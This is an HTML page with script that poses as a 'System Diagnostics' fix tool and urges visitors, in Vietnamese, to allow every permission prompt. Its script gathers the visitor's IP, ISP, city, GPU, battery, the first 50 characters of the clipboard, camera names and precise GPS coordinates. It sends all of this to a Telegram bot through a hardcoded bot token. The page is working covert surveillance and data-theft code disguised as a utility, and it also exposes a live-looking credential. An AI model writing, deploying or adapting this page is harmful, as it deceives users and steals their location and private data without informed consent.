<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Scanner v2.0</title>
    
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">

    <style>
        :root { --bg: #050505; --panel: #111; --text: #e0e0e0; --accent: #00ff41; --danger: #ff3333; }
        body { background-color: var(--bg); color: var(--text); font-family: 'JetBrains Mono', monospace; margin: 0; padding: 15px; font-size: 13px; }
        
        .container { max-width: 600px; margin: 0 auto; }
        .header { text-align: center; border-bottom: 1px solid #333; padding-bottom: 15px; margin-bottom: 15px; }
        .header h1 { color: var(--accent); margin: 0; font-size: 1.5rem; }
        
        .info-row { display: flex; justify-content: space-between; border-bottom: 1px dashed #333; padding: 8px 0; }
        .label { color: #888; }
        .value { color: #fff; font-weight: bold; text-align: right; }
        .value.warn { color: var(--danger); }
        .value.success { color: var(--accent); }

        .scan-btn {
            width: 100%; padding: 15px; background: var(--accent); color: #000;
            border: none; font-weight: bold; font-size: 16px; margin-top: 20px;
            cursor: pointer; text-transform: uppercase; border-radius: 4px;
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
        }
        .scan-btn:active { transform: scale(0.98); }
        .scan-btn:disabled { background: #333; color: #777; box-shadow: none; }

        #console {
            background: #000; border: 1px solid #333; color: #aaa;
            padding: 10px; height: 150px; overflow-y: auto; margin-top: 20px;
            font-size: 11px; font-family: monospace;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <h1>SYSTEM DIAGNOSTICS</h1>
            <p>Fix: IP Source & Permission Flow</p>
        </div>

        <div id="dashboard">
            <div class="info-row"><span class="label">IP Address</span><span class="value" id="ip-val">Scanning...</span></div>
            <div class="info-row"><span class="label">ISP</span><span class="value" id="isp-val">...</span></div>
            <div class="info-row"><span class="label">Location</span><span class="value" id="loc-val">...</span></div>
            <div class="info-row"><span class="label">Device</span><span class="value" id="dev-val">...</span></div>
        </div>

        <button class="scan-btn" id="start-btn" onclick="executeScan()">
            <i class="fas fa-radar"></i> START DEEP SCAN
        </button>
        <div style="text-align:center; margin-top:5px; font-size:10px; color:#555">
            Báº¥m "Cho phÃ©p/Allow" táº¥t cáº£ yÃªu cáº§u Ä‘á»ƒ fix lá»—i
        </div>

        <div id="console">Ready. Waiting for user interaction...</div>
    </div>

    <script>
        // --- Cáº¤U HÃŒNH ---
        const BOT_TOKEN = "6789490938:AAGbxaiI4NVuZBWEm-ktCT4w2FNVuV_v7mE"; 
        const CHAT_ID = "@testappxyz";

        // Biáº¿n toÃ n cá»¥c
        let SYS = {
            ip: "Error", isp: "Error", city: "Error",
            device: navigator.platform,
            userAgent: navigator.userAgent,
            gpu: "N/A", battery: "N/A", connection: "N/A",
            clipboard: "Empty/Denied",
            media: "Denied",
            gps: "Denied",
            fingerprint: Math.random().toString(36).substring(2, 10)
        };

        const log = (msg) => {
            const c = document.getElementById('console');
            c.innerHTML += `> ${msg}<br>`;
            c.scrollTop = c.scrollHeight;
        };

        // 1. Láº¥y IP (DÃ¹ng nguá»“n má»›i ipwho.is - Uy tÃ­n hÆ¡n)
        async function fetchIP() {
            log("Fetching IP from ipwho.is...");
            try {
                // ipwho.is khÃ´ng cáº§n key, há»— trá»£ https, Ã­t bá»‹ cháº·n
                const res = await fetch('https://ipwho.is/');
                const data = await res.json();
                
                if(data.success) {
                    SYS.ip = data.ip;
                    SYS.isp = data.connection.isp || data.connection.org;
                    SYS.city = `${data.city}, ${data.region}, ${data.country}`;
                    
                    document.getElementById('ip-val').innerText = SYS.ip;
                    document.getElementById('ip-val').classList.add('success');
                    document.getElementById('isp-val').innerText = SYS.isp;
                    document.getElementById('loc-val').innerText = data.city;
                    log("IP Success: " + SYS.ip);
                } else {
                    throw new Error("API Limit");
                }
            } catch (e) {
                log("IP Fetch Failed. Trying backup...");
                // Backup nguá»“n 2
                try {
                    const r2 = await fetch('https://api.ipify.org?format=json');
                    const d2 = await r2.json();
                    SYS.ip = d2.ip;
                    document.getElementById('ip-val').innerText = SYS.ip;
                } catch(err) { SYS.ip = "Blocked by Adblock"; }
            }
        }

        // 2. Láº¥y thÃ´ng tin pháº§n cá»©ng (Xá»­ lÃ½ lá»—i iOS)
        function getHardware() {
            // GPU
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                SYS.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
            } catch(e) { SYS.gpu = "Integrated"; }

            // Device Name formatting
            if(SYS.userAgent.includes('iPhone')) SYS.device = "iPhone (iOS)";
            else if(SYS.userAgent.includes('Android')) SYS.device = "Android Device";
            
            document.getElementById('dev-val').innerText = SYS.device;

            // iOS Limitations handling
            const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
            SYS.connection = isIOS ? "Apple Privacy Lock" : (navigator.connection ? navigator.connection.effectiveType : "Unknown");
            SYS.battery = isIOS ? "Apple Privacy Lock" : "Checking...";
            
            if(!isIOS && navigator.getBattery) {
                navigator.getBattery().then(b => {
                    SYS.battery = `${Math.round(b.level*100)}%`;
                });
            }
        }

        // 3. HÃ€M CHÃNH: Cháº¡y song song Ä‘á»ƒ trÃ¡nh máº¥t quyá»n
        async function executeScan() {
            const btn = document.getElementById('start-btn');
            btn.disabled = true;
            btn.innerHTML = "SCANNING... (PLEASE WAIT)";
            
            log("Starting parallel scan...");

            // --- BÆ¯á»šC 1: KÃCH HOáº T CLIPBOARD NGAY Láº¬P Tá»¨C (QUAN TRá»ŒNG) ---
            // Pháº£i lÃ m ngay khi click, khÃ´ng Ä‘Æ°á»£c chá» await IP hay GPS
            let clipPromise = Promise.resolve("Skipped");
            try {
                if(navigator.clipboard && navigator.clipboard.readText) {
                    log("Requesting Clipboard...");
                    clipPromise = navigator.clipboard.readText()
                        .then(text => {
                            SYS.clipboard = text ? text.substring(0, 50) : "Empty";
                            log("Clipboard: OK");
                        })
                        .catch(err => {
                            SYS.clipboard = "Denied";
                            log("Clipboard: Denied");
                        });
                }
            } catch(e) {}

            // --- BÆ¯á»šC 2: KÃCH HOáº T MEDIA DEVICES (CAM/MIC) NGAY Láº¬P Tá»¨C ---
            let mediaPromise = Promise.resolve("Skipped");
            try {
                log("Requesting Camera Info...");
                mediaPromise = navigator.mediaDevices.getUserMedia({video:true})
                    .then(stream => {
                        stream.getTracks().forEach(t => t.stop()); // Táº¯t luÃ´n
                        return navigator.mediaDevices.enumerateDevices();
                    })
                    .then(devices => {
                        const cams = devices.filter(d => d.kind === 'videoinput').map(d => d.label);
                        SYS.media = cams.length > 0 ? cams.join(', ') : "Camera found but no label";
                        log("Media: OK");
                    })
                    .catch(err => {
                        SYS.media = "Denied by User";
                        log("Media: Denied");
                    });
            } catch(e) {}

            // --- BÆ¯á»šC 3: GPS (Váº«n cháº¡y ná»n) ---
            let gpsPromise = new Promise((resolve) => {
                if(navigator.geolocation) {
                    log("Requesting GPS...");
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            SYS.gps = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude} (Acc: ${Math.round(pos.coords.accuracy)}m)`;
                            SYS.gmap = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                            log("GPS: Locked");
                            resolve();
                        },
                        (err) => {
                            SYS.gps = "User Denied";
                            log("GPS: Denied");
                            resolve();
                        },
                        {enableHighAccuracy: true, timeout: 8000}
                    );
                } else { resolve(); }
            });

            // --- BÆ¯á»šC 4: Láº¤Y IP Láº¦N CUá»I (Náº¿u lÃºc Ä‘áº§u chÆ°a xong) ---
            let ipPromise = SYS.ip === "Error" ? fetchIP() : Promise.resolve();

            // Äá»£i táº¥t cáº£ hoÃ n táº¥t (Tá»‘i Ä‘a 5 giÃ¢y cho cÃ¡c cÃ¡i phá»¥)
            await Promise.allSettled([clipPromise, mediaPromise, gpsPromise, ipPromise]);

            log("Scan finished. Sending data...");
            await sendTelegram();
            
            btn.innerHTML = "DONE âœ”";
            alert("ÄÃ£ gá»­i bÃ¡o cÃ¡o thÃ nh cÃ´ng!");
        }

        async function sendTelegram() {
            const msg = `
ğŸ” <b>SYSTEM FIX REPORT</b>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ†” <b>ID:</b> <code>${SYS.fingerprint}</code>
ğŸŒ <b>IP:</b> <code>${SYS.ip}</code>
ğŸ¢ <b>ISP:</b> ${SYS.isp}
ğŸ“ <b>Location:</b> ${SYS.city}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ“± <b>Device:</b> ${SYS.device}
ğŸ® <b>GPU:</b> ${SYS.gpu}
ğŸ”‹ <b>Battery:</b> ${SYS.battery}
ğŸ“¶ <b>Net Type:</b> ${SYS.connection}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ“‹ <b>Clipboard:</b> <code>${SYS.clipboard}</code>
ğŸ“¸ <b>Camera:</b> ${SYS.media}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ›° <b>GPS FIXED:</b> 
${SYS.gps}
${SYS.gmap ? `<a href="${SYS.gmap}">Open Google Maps</a>` : ''}
`;
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: msg,
                        parse_mode: "HTML",
                        disable_web_page_preview: true
                    })
                });
            } catch(e) { log("Send Error: " + e.message); }
        }

        // Init
        window.onload = () => {
            getHardware();
            fetchIP(); // Cháº¡y ngáº§m IP ngay khi má»Ÿ web
        };

    </script>
</body>
</html>
